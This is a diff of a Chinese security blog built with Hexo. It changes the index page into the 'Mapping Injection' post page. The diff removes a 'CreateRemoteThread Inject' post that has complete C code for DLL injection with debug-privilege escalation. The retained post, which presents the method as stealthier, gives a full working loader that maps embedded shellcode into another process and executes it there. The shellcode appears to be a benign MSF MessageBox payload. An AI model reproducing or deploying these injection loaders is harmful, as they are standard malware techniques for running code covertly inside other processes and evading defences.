@@ -22,28 +22,33 @@
     var CONFIG = {"hostname":"oscraptcoco.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Welcome">
-<meta property="og:url" content="https://oscraptcoco.github.io/index.html">
+  <meta name="description" content="简介:通过内存映射的姿势来进行注入，简单快捷，能够有效增加隐蔽性 原理以及步骤：   使用CreateFileMapping函数创建一个共享内存对象句柄 使用MapViewOfFile函数共享内存映射到调用的进程 复制需要注入的代码到共享的内存空间 使用MapViewOfFile2函数将共享内存映射到远程进程（该远程句柄又OpenProcess函数得到） 使用CreateRemoteThread">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mapping Injection">
+<meta property="og:url" content="https://oscraptcoco.github.io/2022/06/23/%E4%BA%8C%E3%80%81Mapping%20Injection/index.html">
 <meta property="og:site_name" content="Welcome">
+<meta property="og:description" content="简介:通过内存映射的姿势来进行注入，简单快捷，能够有效增加隐蔽性 原理以及步骤：   使用CreateFileMapping函数创建一个共享内存对象句柄 使用MapViewOfFile函数共享内存映射到调用的进程 复制需要注入的代码到共享的内存空间 使用MapViewOfFile2函数将共享内存映射到远程进程（该远程句柄又OpenProcess函数得到） 使用CreateRemoteThread">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-06-23T03:55:18.000Z">
+<meta property="article:modified_time" content="2022-06-27T09:34:57.687Z">
 <meta property="article:author" content="Oscraptcoco">
+<meta property="article:tag" content="注入">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="https://oscraptcoco.github.io/">
+<link rel="canonical" href="https://oscraptcoco.github.io/2022/06/23/%E4%BA%8C%E3%80%81Mapping%20Injection/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>Welcome</title>
+  <title>Mapping Injection | Welcome</title>
   
 
 
@@ -179,100 +184,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://oscraptcoco.github.io/2022/06/23/%E4%B8%80%E3%80%81%E8%BF%9C%E7%A8%8BDll%E6%B3%A8%E5%85%A5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://lh3.googleusercontent.com/Vbd2SNR9nNWhdYhdg2z2Mjwn-fgxVK6nzVWlnHor7dYYI56Ls6wtdWKMEHLUdMFAPIGu8w=s85">
-      <meta itemprop="name" content="Oscraptcoco">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Welcome">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/06/23/%E4%B8%80%E3%80%81%E8%BF%9C%E7%A8%8BDll%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">CreateRemoteThread Inject</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-06-23 11:55:18" itemprop="dateCreated datePublished" datetime="2022-06-23T11:55:18+08:00">2022-06-23</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-06-27 17:35:17" itemprop="dateModified" datetime="2022-06-27T17:35:17+08:00">2022-06-27</time>
-              </span>
-
-          
-
-        </div>
-      </header>
 
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <ul>
-<li>原理以及步骤：</li>
-</ul>
-<ol>
-<li>使用AdjustTokenPrivileges函数对当前进程进行提权</li>
-<li>使用Process32First函数取得目标进程ID</li>
-<li>使用OpenProcess函数打开目标进程</li>
-<li>使用VirtualAllocEx函数为目标进程分配空间</li>
-<li>使用WriteProcessMemory函数写入Dll路径</li>
-<li>使用GetProcAddress函数取得LoadLibrary函数地址</li>
-<li>使用CreateRemoteThread函数创建远程线程执行LoadLibrary</li>
-</ol>
-<ul>
-<li>具体实现过程：</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">AdjustPrivilege</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE TheToken = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (::OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;TheToken))</span><br><span class="line">	&#123;</span><br><span class="line">		TOKEN_PRIVILEGES tkp;</span><br><span class="line">		LookupPrivilegeValue(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;tkp.Privileges[<span class="number">0</span>].Luid);</span><br><span class="line">		tkp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">		tkp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">		AdjustTokenPrivileges(TheToken, FALSE, &amp;tkp, <span class="keyword">sizeof</span>(tkp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">DWORD <span class="title function_">GetProcessID</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ErrorCode;</span><br><span class="line">	<span class="type">char</span> szExeName[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	PROCESSENTRY32 pe;</span><br><span class="line">	ZeroMemory(&amp;pe, <span class="keyword">sizeof</span>(pe));</span><br><span class="line">	pe.dwSize = <span class="keyword">sizeof</span>(pe);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;输入程序名称：&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, szExeName);</span><br><span class="line">	HANDLE hSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hSnap == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		ErrorCode = GetLastError();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;调用失败,错误码：%d\n&quot;</span>, ErrorCode);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	BOOL bRet = ::Process32First(hSnap, &amp;pe);</span><br><span class="line">	<span class="keyword">while</span> (bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strcmp</span>(pe.szExeFile, szExeName) == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;进程名称：%s\n进程ID：%u\n&quot;</span>, pe.szExeFile, (<span class="type">unsigned</span> <span class="type">int</span>)pe.th32ProcessID);</span><br><span class="line">			<span class="keyword">return</span> pe.th32ProcessID;</span><br><span class="line">		&#125;</span><br><span class="line">		bRet = ::Process32Next(hSnap, &amp;pe);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	DWORD dwProcessId;</span><br><span class="line">	dwProcessId=GetProcessID();</span><br><span class="line">	<span class="type">char</span> *dllpath = (<span class="type">char</span>*)<span class="string">&quot;C:\\Users\\Lenovo\\source\\repos\\Dll\\x64\\Debug\\Dll.dll&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span> (dwProcessId == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;未找到，请重试\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	AdjustPrivilege();</span><br><span class="line"><span class="comment">//打开目标进程取得句柄</span></span><br><span class="line">	HANDLE hTarget = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);</span><br><span class="line">	<span class="keyword">if</span> (hTarget == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;打开错误\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//为目标进程分配大小用Dllpath大小的内存空间</span></span><br><span class="line">	LPVOID paraAddr=::VirtualAllocEx(hTarget, <span class="literal">NULL</span>, <span class="built_in">strlen</span>(dllpath) + <span class="number">1</span>, MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (paraAddr == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;空间分配错误\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//将DllPath写入内存空间</span></span><br><span class="line">	<span class="keyword">if</span> (!::WriteProcessMemory(hTarget, paraAddr, dllpath, <span class="built_in">strlen</span>(dllpath) + <span class="number">1</span>, <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;写入内存失败\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//取得LoadLibrary函数地址</span></span><br><span class="line">	HINSTANCE LibHandle = ::LoadLibrary(<span class="string">&quot;Kernel32&quot;</span>);</span><br><span class="line">	UINT64  ProcAdd = (UINT64)GetProcAddress(LibHandle, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	DWORD threadid = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//创建远程线程</span></span><br><span class="line">	HANDLE hThread = ::CreateRemoteThread(hTarget, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)ProcAdd, paraAddr, <span class="number">0</span>, &amp;threadid);</span><br><span class="line">	::CloseHandle(hTarget);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>效果如下</li>
-</ul>
-<p><img src="https://s3.bmp.ovh/imgs/2022/06/23/9f02f1d55207c1d1.png" alt="                                                                             注入成功"></p>
-<pre><code>                                                                         注入成功
-</code></pre>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
@@ -288,10 +203,9 @@
       <meta itemprop="name" content="Welcome">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/06/23/%E4%BA%8C%E3%80%81Mapping%20Injection/" class="post-title-link" itemprop="url">Mapping Injection</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          Mapping Injection
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -321,7 +235,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <ul>
+        <ul>
 <li>简介:通过内存映射的姿势来进行注入，简单快捷，能够有效增加隐蔽性</li>
 <li>原理以及步骤：</li>
 </ul>
@@ -336,21 +250,33 @@
 <li>具体实现过程：</li>
 </ul>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;OneCore.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">UCHAR Code[] = &#123; <span class="string">&quot;\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02&quot;</span></span><br><span class="line"><span class="string">&quot;\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24&quot;</span></span><br><span class="line"><span class="string">&quot;\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0&quot;</span></span><br><span class="line"><span class="string">&quot;\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e\x4c\x8d&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\x2b\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13&quot;</span></span><br><span class="line"><span class="string">&quot;\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x48\x65\x6c\x6c\x6f&quot;</span></span><br><span class="line"><span class="string">&quot;\x2c\x20\x66\x72\x6f\x6d\x20\x4d\x53\x46\x21\x00\x4d\x65\x73&quot;</span></span><br><span class="line"><span class="string">&quot;\x73\x61\x67\x65\x42\x6f\x78\x00&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, <span class="literal">NULL</span>, PAGE_EXECUTE_READWRITE, <span class="number">0</span>, <span class="keyword">sizeof</span>(Code), <span class="literal">NULL</span>);</span><br><span class="line">	LPVOID MapAddr = MapViewOfFile(hMapping, FILE_MAP_WRITE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="keyword">sizeof</span>(Code));</span><br><span class="line">	<span class="built_in">memcpy</span>(MapAddr, Code, <span class="keyword">sizeof</span>(Code));</span><br><span class="line">	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, <span class="number">13692</span>);</span><br><span class="line">	LPVOID RemoteMapAddr = MapViewOfFile2(hMapping, hProc, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>, PAGE_EXECUTE_READ);</span><br><span class="line">	HANDLE hRemoteThread = CreateRemoteThread(hProc, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)RemoteMapAddr,<span class="literal">NULL</span>,<span class="number">0</span>,<span class="literal">NULL</span>);</span><br><span class="line">	UnmapViewOfFile(hMapping);</span><br><span class="line">	CloseHandle(hProc);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-      
     </div>
 
     
     
     
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
+          <div class="post-tags">
+              <a href="/tags/%E6%B3%A8%E5%85%A5/" rel="tag"># 注入</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2022/06/23/%E4%B8%80%E3%80%81%E8%BF%9C%E7%A8%8BDll%E6%B3%A8%E5%85%A5/" rel="next" title="CreateRemoteThread Inject">
+      CreateRemoteThread Inject <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
       </footer>
+    
   </article>
   
   
-  
-
-
   
 
 
